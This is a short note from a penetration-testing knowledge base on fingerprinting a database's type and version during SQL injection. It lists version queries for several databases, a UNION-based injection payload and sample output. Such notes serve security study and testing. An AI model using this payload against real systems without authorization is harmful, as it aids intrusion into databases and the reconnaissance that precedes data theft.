# Querying the database type and version
#DATABASEENUM 

Each database provider defines a way to query the version. It's often needed to try different queries to find one that works, allowing to determine the version and the database software.

Some examples of popular databases are:

#SQLiPAYLOAD
Database type| Query
------------ | ------------
Microsoft, MySQL|`SELECT @@version`
Oracle|`SELECT * FROM v$version`
PostgreSQL|`SELECT version()`

Using an `UNION` attack use the following payload
#SQLiPAYLOAD 

```SQL
' UNION SELECT @@version--
```

That might return a result containing the software and version of the database in this case `Microsoft SQL Server`

```
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64) Mar 18 2018 09:11:49 Copyright (c) Microsoft Corporation Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```

## Exploitation examples

- Oracle [[Oracle querying database type and version]]
- MySQL & Microsoft [[MySQL & Microsoft querying database type and version]]


## Further enumeration

[[Listing the contents of the database]]